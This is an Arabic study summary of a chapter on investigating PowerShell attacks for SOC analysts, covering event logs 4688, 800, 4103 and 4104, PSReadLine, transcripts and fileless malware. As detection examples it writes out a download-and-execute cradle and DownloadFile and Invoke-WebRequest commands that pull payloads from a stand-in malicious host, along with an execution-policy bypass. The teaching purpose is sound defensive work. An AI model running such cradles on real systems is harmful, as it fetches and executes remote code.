سأشرح الفصل السادس من كتاب "Effective Threat Investigation for SOC Analysts" بطريقة بسيطة ومفصلة، مع تغطية كل المعلومات الموجودة في الفصل دون تجاهل أي جزء، مع التركيز على النقاط الأساسية التي يجب على محلل مركز العمليات الأمنية (SOC Analyst) معرفتها ليكون ناجحًا. الفصل يركز على **التحقيق في سجلات أحداث PowerShell**، وهو موضوع حيوي بسبب الاستخدام المتزايد لـ PowerShell في الهجمات السيبرانية.

---

### **نظرة عامة على الفصل**

الفصل يهدف إلى تعليمك كيفية التعامل مع **PowerShell** كأداة شائعة في الهجمات السيبرانية، وكيفية تتبع وتحليل الأنشطة المشبوهة باستخدام سجلات الأحداث التي توفرها مايكروسوفت. يغطي الفصل ثلاثة مواضيع رئيسية:

1. **مقدمة عن PowerShell**: ما هو PowerShell، ولماذا يفضله المهاجمون.
2. **أحداث تتبع تنفيذ PowerShell**: سجلات الأحداث التي تساعد على مراقبة أنشطة PowerShell.
3. **التحقيق في هجمات PowerShell**: كيفية اكتشاف وتحليل الهجمات التي تستخدم PowerShell.

---

### **1. مقدمة عن PowerShell**

#### **ما هو PowerShell؟**

- **PowerShell** هو أداة سطر أوامر ولغة برمجة نصية (Scripting Language) طورتها مايكروسوفت في عام 2005، ويأتي مثبتًا افتراضيًا على جميع إصدارات ويندوز الحديثة.
- صُمم لإدارة النظام وتسهيل عمليات **الأتمتة** و**إدارة التهيئة** (Configuration Management).
- يُستخدم بشكل رئيسي من قِبل **مديري النظام** (System Administrators) لأنه أداة قوية تتيح التحكم الكامل تقريبًا في النظام، بما في ذلك الإدارة عن بُعد عبر قنوات مشفرة.

#### **مكونات PowerShell: Cmdlets**

- **Cmdlets** (تُنطق "Command-lets") هي أوامر محددة في PowerShell تُستخدم لأداء مهام معينة.
- تتبع نمط تسمية **فعل-اسم** (Verb-Noun)، مع خيارات إضافية تُسمى Parameters.
- أمثلة:
    - **Get-Process -Name svchost**: يُستخدم لعرض معلومات عن العمليات التي تحمل اسم svchost.
    - **Get-Command -Type Cmdlet**: يُرجع قائمة بجميع Cmdlets المتاحة في PowerShell.

#### **لماذا يفضل المهاجمون PowerShell؟**

الفصل يشرح الأسباب التي تجعل PowerShell أداة مفضلة للمهاجمين:

1. **مثبت افتراضيًا**: PowerShell موجود على جميع أنظمة ويندوز، مما يجعله متاحًا دائمًا.
2. **قلة الأثر الرقمي**: يترك آثارًا رقمية قليلة، مما يصعب اكتشافه مقارنة بالبرمجيات الخبيثة التقليدية.
3. **إمكانيات الوصول عن بُعد**: يوفر القدرة على التحكم عن بُعد عبر قنوات مشفرة.
4. **مجتمع نشط**: هناك مجتمع كبير يوفر نصوص PowerShell جاهزة للاستخدام في الهجمات.
5. **أطر هجوم متاحة**: أطر مثل **PowerSploit**، **Empire**، و**Nishang** تُستخدم لتسهيل الهجمات.
6. **التخفي ضمن الأنشطة الشرعية**: لأن PowerShell يُستخدم بشكل شائع من قِبل مديري النظام، فإن الأنشطة الخبيثة يمكن أن تتخفى وسط الأنشطة الشرعية.
7. **المرونة في مراحل الهجوم**: يمكن استخدامه في جميع مراحل سلسلة الهجوم (Attack Chain)، كما سيتم توضيحه لاحقًا.

#### **إحصائيات استخدام PowerShell في الهجمات**

- وفقًا لتقارير **Symantec**، زادت الهجمات الخبيثة باستخدام PowerShell بنسبة **60%** من النصف الثاني من 2017 إلى النصف الأول من 2018، وتضاعفت من الربع الأول إلى الربع الثاني من 2018.
- وفقًا لتقارير **McAfee**، زادت الهجمات بنسبة **20%** من الربع الثالث من 2017 إلى الربع الثاني من 2018.

#### **استخدام PowerShell في مراحل الهجوم المختلفة**

PowerShell يُستخدم في جميع مراحل سلسلة الهجوم (وفقًا لإطار MITRE ATT&CK):

- **الوصول الأولي (Initial Access)**: تنفيذ نصوص خبيثة عبر مستندات مثل Word أو Excel.
- **التنفيذ (Execution)**: تشغيل أوامر أو نصوص خبيثة مباشرة في الذاكرة.
- **الاستمرارية (Persistence)**: إنشاء مهام مجدولة أو تعديل السجل (Registry) لضمان استمرار الهجوم.
- **الاستطلاع (Discovery)**: جمع معلومات عن النظام أو الشبكة (مثل net user أو Get-Process).
- **تسريب البيانات (Exfiltration)**: جمع ونقل البيانات إلى خادم خارجي.
- **التنقل الجانبي (Lateral Movement)**: الانتقال إلى أنظمة أخرى داخل الشبكة.
- **تفادي الكشف (Defense Evasion)**: استخدام تقنيات مثل تجاوز سياسة التنفيذ (Execution Policy Bypass).
- **الاتصال بالقيادة والتحكم (C2)**: إنشاء قنوات اتصال مع خوادم المهاجم.

#### **أمثلة على أطر PowerShell المستخدمة في الهجمات**

الفصل يذكر جدولًا (Table 6.1) يوضح أطر PowerShell مفتوحة المصدر التي يستخدمها المهاجمون:

- **APT29**: يستهدف قطاعات الدفاع والطاقة في أوروبا وأمريكا، يستخدم PowerShell للاستطلاع وتسريب البيانات.
- **أطر شائعة**: PowerSploit، Empire، Nishang، وWinfrnnum تُستخدم في مراحل مثل التنفيذ، الاستمرارية، والتنقل الجانبي.

#### **أوامر PowerShell الشائعة في الهجمات**

الفصل يقدم جدولًا (Table 6.2) يحتوي على ثلاثة أوامر PowerShell شائعة يستخدمها المهاجمون:

1. **DownloadFile**:
    - **الوصف**: وظيفة من مكتبة System.Net.WebClient تُستخدم لتحميل محتوى من عنوان URL إلى ملف.
    - **الاستخدام الخبيث**: تحميل برمجيات خبيثة أو نصوص من خادم خارجي.
2. **ExecutionPolicy**:
    - **الوصف**: يتحكم في سياسات تنفيذ النصوص، مثل تحديد ما إذا كان يمكن تشغيل النصوص أم لا.
    - **الاستخدام الخبيث**: استخدام -ExecutionPolicy Bypass لتجاوز القيود الأمنية وتشغيل نصوص خبيثة.
3. **Invoke-WebRequest** (غير مفصل في النص ولكنه شائع):
    - **الوصف**: يُستخدم لإرسال طلبات HTTP/HTTPS وتنزيل محتوى.
    - **الاستخدام الخبيث**: تنزيل حمولات (Payloads) أو الاتصال بخوادم القيادة والتحكم (C2).

#### **لماذا هذا مهم لمحلل SOC؟**

- **فهم PowerShell ضروري**: لأنه أداة قوية تُستخدم في الهجمات، ومعرفة كيفية عملها تساعدك على تمييز الأنشطة الشرعية عن الخبيثة.
- **التعرف على الأوامر الشائعة**: معرفة Cmdlets مثل Get-Process أو DownloadFile وكيفية استخدامها في الهجمات يساعدك على اكتشاف الأنشطة المشبوهة.
- **التخفي**: بما أن PowerShell يُستخدم في الأنشطة الشرعية، يجب عليك التركيز على سياق الاستخدام (مثل وسائط الأوامر أو المسارات) للكشف عن الهجمات.

---

### **2. أحداث تتبع تنفيذ PowerShell**

مايكروسوفت توفر عدة سجلات أحداث تساعد على تتبع أنشطة PowerShell. هذه السجلات موجودة في ملفين رئيسيين:

1. **Windows PowerShell Event Log**: يحتوي على Event ID 800.
2. **Microsoft-Windows-PowerShell/Operational Event Log**: يحتوي على Event ID 4103 و4104.

#### **السجلات الرئيسية**

1. **Event ID 4688 (من الفصل الخامس)**:
    - **الموقع**: سجل الأمان (Security Event Log).
    - **الوظيفة**: يسجل إنشاء عملية PowerShell جديدة (powershell.exe) مع وسائط سطر الأوامر.
    - **الأهمية**: يوفر معلومات أساسية عن تنفيذ PowerShell، مثل المسار وسطر الأوامر.
2. **Event ID 800**:
    - **الموقع**: Windows PowerShell Event Log.
    - **الوظيفة**: يسجل تنفيذ الأوامر في وحدة تحكم PowerShell (Console).
    - **الخصائص**:
        - مُفعل افتراضيًا في جميع إصدارات PowerShell.
        - يسجل الأوامر التي يتم إدخالها مباشرة في وحدة التحكم، مع اسم المستخدم وإصدار PowerShell.
    - **مثال**: إذا أُدخل أمر مثل whoami أو ipconfig في وحدة التحكم، سيتم تسجيله هنا.
3. **Event ID 4103**:
    - **الموقع**: Microsoft-Windows-PowerShell/Operational Event Log.
    - **الوظيفة**: يسجل الوحدات (Modules) وCmdlets التي تم تنفيذها.
    - **الأهمية**: يوفر تفاصيل أقل من Event ID 4104، لكنه مفيد لاكتشاف الوحدات المستخدمة في التنفيذ.
4. **Event ID 4104**:
    - **الموقع**: Microsoft-Windows-PowerShell/Operational Event Log.
    - **الوظيفة**: يسجل محتوى النصوص (Script Blocks) التي يتم تنفيذها، وهو جزء من ميزة **Script Block Logging** التي أُضيفت بداية من PowerShell الإصدار 5.
    - **الخصائص**:
        - يسجل النص الكامل للنص المنفذ، حتى لو كانت ميزة Script Block Logging غير مُفعلة، إذا كان النص مشبوهًا.
        - إذا كان النص طويلًا، يتم تقسيمه إلى عدة أحداث، كل حدث يبدأ بعبارة "Creating Scriptblock text (X of Y)"، حيث X هو رقم القسم وY هو العدد الإجمالي للأقسام.
        - يحتوي على **ScriptBlock ID**، وهو معرف فريد يُستخدم لربط الأقسام المختلفة لنفس النص.
        - يحتوي على حقل **Path** (إذا كان النص محفوظًا كملف).
    - **مثال**: في مجموعة بيانات APT29 (من HELK)، يسجل Event ID 4104 نصًا يجمع ملفات بامتدادات معينة ويضغطها في ملف ZIP.

#### **ميزات التسجيل الإضافية**

1. **PSReadLine**:
    - **الوظيفة**: يسجل سجل الأوامر التي يتم إدخالها في وحدة تحكم PowerShell، مشابه لأمر history في لينكس.
    - **الموقع**: يُخزن في ملف نصي (.txt) في C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine.
    - **الأهمية**: يوفر سجلًا للأوامر التي أدخلها المستخدم، مما يساعد في تتبع الأنشطة.
2. **Transcripts**:
    - **الوظيفة**: يسجل تفاصيل شاملة عن تنفيذ PowerShell، بما في ذلك وقت البدء، اسم المستخدم، اسم الجهاز، إصدار PowerShell، مدخلات ومخرجات الأوامر، ورسائل الأخطاء.
    - **الموقع**: يُخزن في مجلد المستندات (Documents) افتراضيًا عند تشغيل أمر Start-Transcript.
    - **الأهمية**: يوفر معلومات أكثر تفصيلًا من PSReadLine، لكنه غير مُفعل افتراضيًا.
    - **مثال**: في سيناريو هجوم، نفّذ المهاجم أمر whoami (للحصول على معلومات المستخدم) ثم ipconfig (للحصول على معلومات الشبكة) بعد فشل أمر ifconfig (لأنه غير مدعوم في ويندوز).

#### **كيفية إعادة بناء نص PowerShell باستخدام Event ID 4104**

- إذا كان النص المنفذ طويلًا، يتم تقسيمه إلى عدة أحداث مع نفس **ScriptBlock ID**.
- يمكنك إعادة بناء النص يدويًا عن طريق:
    1. جمع كل الأحداث التي تحمل نفس ScriptBlock ID.
    2. ترتيب الأقسام بناءً على "Creating Scriptblock text (X of Y)".
    3. نسخ الأقسام إلى محرر نصوص مثل Notepad.
- أو استخدام نصوص تلقائية مثل **ExtractAllScripts.ps1** (المتوفر على GitHub) لإعادة بناء النصوص تلقائيًا.
- بعد إعادة البناء، يمكن تحليل النص باستخدام:
    - **Sandbox**: لتنفيذ النص في بيئة آمنة.
    - **VirusTotal**: للتحقق من وجود برمجيات خبيثة.
    - **YARA Rules**: للبحث عن أنماط خبيثة (يُغطى في الفصل 15).

#### **لماذا هذا مهم لمحلل SOC؟**

- **Event ID 4104 هو الأقوى**: لأنه يسجل النصوص المنفذة بالكامل، مما يتيح لك تحليل الهجمات بدون ملفات (Fileless Attacks).
- **Event ID 800 وPSReadLine**: مفيدان لتتبع الأوامر المُدخلة مباشرة في وحدة التحكم.
- **Transcripts**: توفر سياقًا إضافيًا، لكن يجب تفعيلها يدويًا على الخوادم الحرجة.
- يمكن إرسال هذه السجلات إلى حلول **SIEM** (مثل Splunk أو HELK) لتحليلها بشكل مركزي.

---

### **3. التحقيق في هجمات PowerShell**

هذا القسم يركز على كيفية اكتشاف وتحليل الهجمات التي تستخدم PowerShell، مع التركيز على **البرمجيات الخبيثة بدون ملفات (Fileless Malware)** وأمثلة عملية.

#### **ما هي البرمجيات الخبيثة بدون ملفات؟**

- **التعريف**: برمجيات خبيثة تعمل مباشرة في الذاكرة دون كتابة ملفات تنفيذية على القرص، مما يجعل اكتشافها صعبًا.
- **لماذا PowerShell؟**: لأنه يتيح تنفيذ النصوص مباشرة في الذاكرة، مما يتفادى آليات الحماية التقليدية.

#### **مثال: PowerShell Cradle**

- **التعريف**: نص PowerShell يقوم بتنزيل وتنفيذ نص خبيث مباشرة في الذاكرة.
- **مثال نموذجي**:
    
    powershell
    
    طيالتفاف
    
    نسخ
    
    `   powershell.exe -ep bypass -nop -noexit -c "(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1') | iex"       `
    
    - **التفسير**:
        - -ep bypass: يتجاوز سياسة التنفيذ (Execution Policy).
        - -nop: يتجاوز ملف التهيئة (Profile).
        - -noexit: يحافظ على استمرار جلسة PowerShell بعد التنفيذ.
        - -c: يحدد الأمر الذي سيتم تنفيذه.
        - New-Object Net.WebClient: ينشئ كائنًا للوصول إلى الإنترنت.
        - DownloadString: ينزّل نصًا من عنوان URL.
        - iex (Invoke-Expression): ينفّذ النص المُنزّل مباشرة في الذاكرة.
    - **الأهمية**: هذا النص يُستخدم لتنزيل حمولات خبيثة دون كتابة ملفات على القرص.

#### **أوامر وCmdlets مشبوهة**

الفصل يسرد بعض الأوامر وCmdlets التي يستخدمها المهاجمون:

1. **DownloadFile**:
    - تُستخدم لتنزيل ملفات من عنوان URL إلى القرص.
    - **مثال مشبوه**: DownloadFile('http://malicious.com/malware.exe', 'C:\Temp\malware.exe').
2. **ExecutionPolicy Bypass**:
    - تُستخدم لتجاوز القيود الأمنية التي تمنع تنفيذ النصوص.
    - **مثال مشبوه**: powershell.exe -ExecutionPolicy Bypass -File malicious.ps1.
3. **Invoke-WebRequest**:
    - تُستخدم لإرسال طلبات ويب وتنزيل محتوى.
    - **مثال مشبوه**: Invoke-WebRequest -Uri 'http://malicious.com/payload' -OutFile 'C:\Temp\payload.exe'.

#### **مثال عملي من سجلات APT29**

- في مجموعة بيانات APT29 (متوفرة على GitHub)، يُظهر Event ID 4104 نصًا يقوم بجمع ملفات بامتدادات معينة (مثل .docx أو .pdf) وضغطها في ملف ZIP باسم Data.zip.
- هذا يشير إلى هجوم تسريب بيانات (Data Exfiltration).

#### **كيفية التحقيق في هجمات PowerShell**

1. **تحليل Event ID 4688**:
    - تحقق من وسائط سطر الأوامر (Command Line) لعملية powershell.exe.
    - ابحث عن أوامر مشبوهة مثل -ep bypass أو DownloadString.
2. **تحليل Event ID 4104**:
    - إعادة بناء النصوص المنفذة باستخدام ScriptBlock ID.
    - تحليل النصوص في بيئة آمنة (Sandbox) أو باستخدام VirusTotal أو YARA.
3. **تحليل Event ID 800 وPSReadLine**:
    - راجع الأوامر المُدخلة في وحدة التحكم لتحديد الأنشطة اليدوية للمهاجم.
    - مثال: إذا رأيت أوامر مثل whoami متبوعة بـ ipconfig، فقد تكون جزءًا من استطلاع الشبكة.
4. **تحليل Transcripts**:
    - إذا كانت مُفعلة، تحقق من ملفات Transcripts للحصول على سياق إضافي مثل رسائل الأخطاء أو مخرجات الأوامر.
5. **ربط الأحداث**:
    - استخدم شجرة العمليات (Process Tree) من Event ID 4688 لتحديد العملية الأم التي أطلقت powershell.exe.
    - مثال: إذا كانت العملية الأم هي excel.exe، فقد يكون ذلك مؤشرًا على مستند أوفيس خبيث.

#### **لماذا هذا مهم لمحلل SOC؟**

- **الكشف عن الهجمات بدون ملفات**: PowerShell هو أداة شائعة في الهجمات بدون ملفات، لذا فإن فهم سجلات مثل Event ID 4104 ضروري.
- **التركيز على وسائط الأوامر**: وسائط مثل -ep bypass أو DownloadString هي مؤشرات قوية على النشاط الخبيث.
- **استخدام الأدوات**: أدوات مثل HELK وExtractAllScripts.ps1 تساعد في تحليل السجلات بسرعة وكفاءة.

---

### **النقاط الأساسية التي يجب على محلل SOC معرفتها**

لكي تكون محلل SOC ناجحًا، ركز على النقاط التالية من الفصل:

1. **فهم PowerShell وأهميته**:
    - PowerShell أداة قوية تُستخدم في الهجمات بسبب توفرها، قلة آثارها الرقمية، وقدرتها على التخفي.
    - تعرف على Cmdlets الشائعة مثل DownloadFile وInvoke-WebRequest وكيفية استخدامها في الهجمات.
2. **إتقان سجلات الأحداث**:
    - **Event ID 4104**: الأكثر أهمية لأنه يسجل النصوص المنفذة، مما يتيح الكشف عن الهجمات بدون ملفات.
    - **Event ID 4688**: ركز على وسائط سطر الأوامر لتحديد الأنشطة المشبوهة.
    - **Event ID 800 وPSReadLine**: مفيدان لتتبع الأوامر اليدوية.
    - **Transcripts**: إذا كانت مُفعلة، توفر سياقًا إضافيًا.
3. **اكتشاف السلوكيات المشبوهة**:
    - ابحث عن وسائط مثل -ep bypass، -nop، أو DownloadString في Event ID 4688.
    - تحقق من العمليات الأم غير المتوقعة (مثل word.exe تُنشئ powershell.exe).
    - راقب النصوص التي تُنفذ مباشرة في الذاكرة (PowerShell Cradles).
4. **إعادة بناء النصوص**:
    - استخدم ScriptBlock ID في Event ID 4104 لإعادة بناء النصوص المنفذة.
    - حلل النصوص باستخدام أدوات مثل Sandbox، VirusTotal، أو YARA.
5. **استخدام الأدوات**:
    - **HELK**: لتحليل السجلات (مثل مجموعة بيانات APT29).
    - **ExtractAllScripts.ps1**: لإعادة بناء النصوص تلقائيًا.
    - **VirusTotal/YARA**: للتحقق من النصوص الخبيثة.
    - **LOLBAS**: لفهم كيفية استغلال PowerShell في هجمات العيش على الأرض (Living Off the Land).
6. **الانتباه إلى السياق**:
    - لا تحلل الأوامر بمعزل، بل ركز على العملية الأم، المسار، وسطر الأوامر.
    - مثال: إذا رأيت powershell.exe يُنفذ من C:\Temp بدلاً من \SystemRoot\System32، فهذا مشبوه.

---

### **نصائح إضافية لمحلل SOC**

- **ممارسة عملية**: استخدم مجموعات بيانات مثل APT29 (على GitHub) لتحليل سجلات PowerShell باستخدام أدوات مثل HELK.
- **تعلم من الأمثلة**: راجع الأمثلة في الفصل (مثل PowerShell Cradle أو نص يضغط ملفات في Data.zip) لفهم سيناريوهات الهجوم.
- **تابع المصادر**: راجع مشاريع مثل LOLBAS وGitHub للحصول على أحدث المعلومات عن تقنيات الهجوم.
- **تفعيل التسجيل**: تأكد من تفعيل ميزات مثل Script Block Logging وTranscripts على الخوادم الحرجة.
- **دمج مع SIEM**: قم بإرسال سجلات PowerShell إلى حل SIEM لتحليلها بشكل مركزي.

---

### **خلاصة**

الفصل السادس يزودك بالمعرفة الأساسية لفهم PowerShell، ولماذا يُعتبر أداة مفضلة للمهاجمين، وكيفية تتبع أنشطته باستخدام سجلات الأحداث (Event ID 4688، 800، 4103، 4104) وميزات مثل PSReadLine وTranscripts. المفتاح هو التركيز على تحليل وسائط الأوامر، إعادة بناء النصوص المنفذة، واكتشاف السلوكيات المشبوهة مثل PowerShell Cradles. من خلال إتقان هذه المهارات، يمكنك اكتشاف الهجمات بدون ملفات والأنشطة الخبيثة الأخرى، مما يجعلك محلل SOC ناجحًا قادرًا على حماية الأنظمة بشكل فعال.